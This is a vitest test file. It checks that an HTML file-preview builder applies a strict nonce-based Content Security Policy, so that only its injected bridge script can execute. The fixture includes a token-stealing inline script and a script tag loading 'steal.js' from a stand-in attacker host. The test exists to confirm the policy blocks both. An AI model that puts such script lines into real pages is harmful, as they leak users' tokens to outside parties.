import { describe, expect, it } from 'vitest';

import { buildFilePreviewHtmlDocument } from '../html-preview-document';

describe('HTML file preview security policy', () => {
  it('executes only the nonce-bearing platform bridge', () => {
    const rendered = buildFilePreviewHtmlDocument(
      [
        '<html><head>',
        '<script>window.parent.postMessage({secret:localStorage.token},"*")</script>',
        '<script src="https://attacker.example/steal.js"></script>',
        '</head><body><img src="https://images.example/public.png"></body></html>',
      ].join(''),
      {
        schemaVersion: 1,
        baseUrl: 'https://api.example/vfs/cap/data/',
        expiresIn: 300,
        resourceMounts: [
          {
            pathPrefix: '/data/',
            rootUrl: 'https://api.example/vfs/cap/data/',
          },
        ],
      },
    );

    const nonce = rendered.match(/<script nonce="([a-f0-9]+)">/)?.[1];
    expect(nonce).toBeTruthy();
    expect(rendered).toContain(`script-src 'nonce-${nonce}'`);
    const scriptPolicy = rendered.match(/script-src ([^;]+)/)?.[1];
    expect(scriptPolicy).toBe(`'nonce-${nonce}'`);
    expect(scriptPolicy).not.toContain("'unsafe-inline'");
    expect(scriptPolicy).not.toContain("'unsafe-eval'");
    expect(rendered).toContain("connect-src data: blob: https://api.example/vfs/cap/data/");
    expect(rendered).toContain("img-src data: blob: https://api.example/vfs/cap/data/");
    expect(rendered).toContain("media-src data: blob: https://api.example/vfs/cap/data/");
    expect(rendered).not.toContain('img-src data: blob: http: https:');
    expect(rendered).not.toContain('media-src data: blob: http: https:');
    expect(rendered).toContain("worker-src 'none'");
    expect(rendered).toContain("frame-src 'none'");
    // The original scripts may remain in srcDoc, but CSP grants neither a nonce
    // nor an external source to them, so only the injected bridge can execute.
    expect(rendered).toContain('<script src="https://attacker.example/steal.js"></script>');
    expect(rendered).toContain('<img src="https://images.example/public.png">');
  });
});
